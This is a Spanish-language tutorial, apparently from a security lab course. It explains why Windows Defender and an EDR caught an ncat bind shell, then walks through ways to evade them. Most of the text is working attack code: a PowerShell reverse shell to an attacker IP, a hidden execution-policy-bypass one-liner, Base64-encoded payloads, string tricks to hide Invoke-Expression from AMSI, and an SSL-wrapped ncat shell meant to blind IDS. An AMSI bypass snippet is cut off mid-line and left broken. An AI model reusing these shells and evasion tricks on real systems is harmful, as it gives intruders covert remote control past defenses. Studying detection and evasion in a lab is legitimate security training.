1 ¿Qué se detectó y por qué?

Contexto del ejercicio

Durante el Ejercicio 1 (Bind Shell con ncat -lv -p 4444 -e cmd.exe), al establecerse la conexión desde Kali Linux, Windows Defender y el firewall del host principal generaron múltiples alertas.

Alerta 1 — Firma de binario conocido

Windows Defender❌ DETECTADO
Windows Defender: Behavior:Win32/SuspiciousProcess

Causa: ncat.exe (parte de Nmap) está catalogado como herramienta de doble uso en las bases de firmas de Windows Defender. El comportamiento de spawnear cmd.exe como proceso hijo de ncat.exe es una firma de ataque conocida.

Árbol de procesos❌ ALERTA
ncat.exe (PID: XXXX)
  └── cmd.exe (PID: XXXX)   ← ALERTA: proceso hijo sospechoso

Alerta 2 — Puerto no estándar en escucha

Windows Firewall❌ BLOQUEADO
Windows Firewall: Incoming connection blocked — port 4444

Causa: El puerto 4444 está ampliamente asociado con Metasploit. Windows Firewall lo bloquea por defecto. En la bind shell la víctima escucha activamente en ese puerto.

Alerta 3 — Conexión de red anómala

Host AV / EDR❌ DETECTADO
Host Antivirus / EDR: Outbound connection to unknown IP on non-standard port

Causa: El host principal detectó tráfico saliente desde la VM hacia Kali en un puerto inusual. Los AV modernos monitorean comportamiento de red, no solo archivos.

Alerta 4 — Proceso con consola

Causa: Cualquier proceso que abra una conexión de red Y ejecute un intérprete de comandos es considerado comportamiento de tipo RAT (Remote Access Trojan).

Diagrama de detección

[ncat.exe] ──spawn──► [cmd.exe] │ │ │◄── FIRMA CONOCIDA │◄── PROCESO HIJO SOSPECHOSO │ ▼ [Puerto 4444 abierto] ──► ALERTA FIREWALL │ ▼ [Conexión entrante Kali] ──► ALERTA EDR / HOST AV

2 Nivel 1 — Evasión básica de puerto

Técnica: Usar puertos que parecen legítimos

Los firewalls y EDR básicos filtran por puerto. Usar puertos estándar de servicios comunes reduce la detección automática.

Puerto Protocolo simulado Riesgo de bloqueo
80 HTTP ✅ Muy bajo
443 HTTPS ✅ Muy bajo
8080 HTTP alt. ✅ Bajo
53 DNS ✅ Bajo
22 SSH ⚠️ Medio

Implementación — Bind Shell en puerto 443

Víctima (Windows)CMD
"C:\Program Files (x86)\Nmap\ncat.exe" -lv -p 443 -e cmd.exe
Atacante (Kali)BASH
nc 192.168.X.X 443
⚠️
Resultado esperadoReduce alertas de firewall por puerto, pero no evita la detección de ncat.exe ni el comportamiento de proceso hijo.

3 Nivel 2 — Sin binarios externos (PowerShell puro)

Técnica: Living off the Land (LotL)

Usar herramientas nativas del sistema operativo en lugar de binarios externos. PowerShell tiene acceso completo a las APIs de red.

✅
VentajaNo hay firma de archivo externo. Solo código interpretado por powershell.exe, proceso legítimo del sistema.

3.1 — Reverse Shell PowerShell (básica)

Atacante (Kali) — listenerBASH 
nc -lv -p 4444
Víctima (Windows) — PowerShellPOWERSHELL
$client = New-Object System.Net.Sockets.TCPClient('192.168.X.X', 4444)
$stream = $client.GetStream()
[byte[]]$bytes = 0..65535 | % { 0 }
while (($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
    $data = (New-Object Text.ASCIIEncoding).GetString($bytes, 0, $i)
    $sendback = (Invoke-Expression $data 2>&1 | Out-String)
    $sendback2 = $sendback + 'PS ' + (Get-Location).Path + '> '
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
    $stream.Write($sendbyte, 0, $sendbyte.Length)
    $stream.Flush()
}
$client.Close()

3.2 — One-liner para ejecución rápida

Víctima (Windows)POWERSHELL
powershell -NoP -NonI -W Hidden -Exec Bypass -c "`$c=New-Object Net.Sockets.TCPClient('192.168.X.X',4444);`$s=`$c.GetStream();[byte[]]`$b=0..65535|%{0};while((`$i=`$s.Read(`$b,0,`$b.Length))-ne 0){`$d=(New-Object Text.ASCIIEncoding).GetString(`$b,0,`$i);`$r=(iex `$d 2>&1|Out-String);`$rb=`$r+'PS '+(pwd).Path+'> ';`$rb=[Text.Encoding]::ASCII.GetBytes(`$rb);`$s.Write(`$rb,0,`$rb.Length);`$s.Flush()};`$c.Close()"

Flags importantes

Flag Significado
-NoP Sin perfil de usuario (más rápido, menos rastros)
-NonI No interactivo (no requiere input manual)
-W Hidden Ventana oculta (no visible en escritorio)
-Exec Bypass Bypasa la política de ejecución de scripts

4 Nivel 3 — Ofuscación de comandos

AMSI y Defender analizan patrones de texto en PowerShell. Ofuscar cambia la apariencia del código sin afectar su funcionalidad.

4.1 — Encoding Base64

Kali — generar payloadBASH
# Guardar el comando
echo '`$c=New-Object Net.Sockets.TCPClient("192.168.X.X",4444);...' > payload.ps1

# Codificar en Base64 UTF-16LE
cat payload.ps1 | iconv -t UTF-16LE | base64 -w 0
Víctima (Windows)POWERSHELL
powershell -EncodedCommand <PEGAR_BASE64_AQUI>

4.2 — Concatenación de strings

Víctima (Windows)POWERSHELL
# Evitar escribir "Invoke-Expression" directamente:
`$cmd = "Invoke" + "-" + "Expression"
& `$cmd "whoami"

# O usando ScriptBlock:
`$iex = [ScriptBlock]::Create("IEX")

4.3 — Bypass de AMSI con reflexión .NET

⚠️
Solo con fines educativosDetectado por Defender actualizado. Solo funciona en sistemas sin parches recientes.

[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils') |

5 Nivel 4 — Shell cifrada con SSL

Una shell normal envía comandos en texto plano. SSL/TLS cifra el canal y lo hace opaco para IDS.

5.1 — Shell SSL con Ncat

Atacante (Kali) — generar certificadoBASH
# Generar certificado autofirmado
openssl req -new -x509 -keyout server.key -out server.crt -days 365 -nodes \
  -subj "/C=US/ST=State/L=City/O=Org/CN=server"

# Escuchar con SSL
ncat --ssl --ssl-cert server.crt --ssl-key server.key -lv -p 443
Víctima (Windows)CMD
"C:\Program Files (x86)\Nmap\ncat.exe" --ssl 192.168.X.X 443 -e cmd.exe

5.2 — Comparación de tráfico

SIN SSL (detectable por IDS): → Paquete TCP: "whoami\r\n" → Respuesta: "nt authority\system\r\n" CON SSL (opaco para IDS): → Paquete TLS: [datos cifrados ilegibles] → Respuesta TLS: [datos cifrados ilegibles]
